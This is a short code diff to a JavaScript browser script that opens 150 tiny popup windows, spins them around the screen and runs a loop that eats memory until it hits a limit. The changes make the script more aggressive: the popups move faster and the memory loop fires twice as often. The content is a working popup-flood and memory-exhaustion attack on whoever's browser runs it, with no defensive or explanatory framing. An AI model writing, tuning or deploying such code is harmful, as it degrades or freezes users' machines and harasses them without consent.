@@ -22,7 +22,7 @@
       const now = 150;
       const br = 5;
       const rs = 4;
-      const speed = -500;
+      const speed = 1;
 
       for (let i = 0; i < now; i++) {
         const popup = window.open('', '', 'width=50,height=50');
@@ -63,7 +63,7 @@
               const centerY = screen.availHeight / 2 - 100;
 
               function animate() {
-                angle += 0.05; // Adjusted speed for visible movement
+                angle += speed; // Adjusted speed for visible movement
                 const x = centerX + radius * Math.cos(angle);
                 const y = centerY + radius * Math.sin(angle);
                 window.moveTo(x, y);
@@ -85,7 +85,7 @@
                 } catch (e) {
                   console.error("Memory limit reached");
                 }
-                setTimeout(ramLoop, 1000);
+                setTimeout(ramLoop, 500);
               }
 
               animate();
